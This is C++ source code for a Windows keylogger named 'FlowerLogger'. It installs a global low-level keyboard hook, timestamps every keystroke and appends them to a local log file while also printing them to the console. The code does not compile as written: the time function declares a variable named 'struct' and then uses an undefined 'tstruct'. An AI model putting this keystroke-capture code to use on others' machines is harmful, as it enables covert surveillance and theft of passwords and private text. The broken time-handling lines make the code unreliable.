#include <iostream>
#include <fstream>
#include <windows.h>
#include <string>
#include <ctime>
#include <map>

std::ofstream logFile;
std::string logFilePath = "logs.txt";
bool logToFile = true;
bool logToConsole = true;

std::string getCurrentTime() {
    time_t now = time(0);
    struct tm struct;
    char buf[80];
    tstruct = *localtime(&now);
    strftime(buf, sizeof(buf), "%H:%M:%S", &struct);
    return std::string(buf);
}

void FlowerLogging() {
    try {
        logFile.open(logFilePath, std::ios::app);
        if (!logFile.is_open()) {
            throw std::runtime_error("[failed to open log file]");
        }
    } catch (const std::exception& e) {
        logToFile = false;
        std::cout << "[ERROR] couldn't open the log file: " << e.what() << "console logging activated" << std::endl;
    }
}

void FlowerKey(const std::string& keyName) {
    std::string timestamp = getCurrentTime();
    std::string logMessage = "[LOGGED]" + timestamp + " : \"" + keyName + "\"\n";

    if (logToFile && logFile.is_open()) {
        logFile << logMessage;
    }
    if (logToConsole) {
        std::cout << logMessage;
    }
}

std::map<DWORD, std::string> keyMap = {
    {VK_RETURN, "[ENTER]"},
    {VK_BACK, "[BACKSPACE]"},
    {VK_SPACE, "[SPACE]"},
    {VK_ESCAPE, "[EXITING...]"}
};

LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* keyInfo = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        DWORD key = keyInfo->vkCode;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            auto it = keyMap.find(key);
            if (it != keyMap.end()) {
                FlowerKey(it->second);
            } else {
                if (key >= 32 && key <= 126) {
                    FlowerKey(std::string(1, static_cast<char>(key)));
                } else {
                    FlowerKey("[UNKNOWN]");
                }
            }

            if (key == VK_ESCAPE) {
                exit(0);
            }
        }
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

HHOOK hHook;

void setKeyboardHook() {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, NULL, 0);
    if (hHook == NULL) {
        std::cerr << "Failed to install hook!" << std::endl;
        exit(1);
    }
}

void startLogging() {
    FlowerLogging();
    setKeyboardHook();
    std::cout << "FlowerLogger started | [ESC] to exit." << std::endl;
}

void stopLogging() {
    if (logFile.is_open()) {
        logFile.close();
    }
    std::cout << "FlowerLogger stopped | logs have been saved in a txt" << std::endl;
}

int main() {
    startLogging();
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    stopLogging();
    return 0;
}
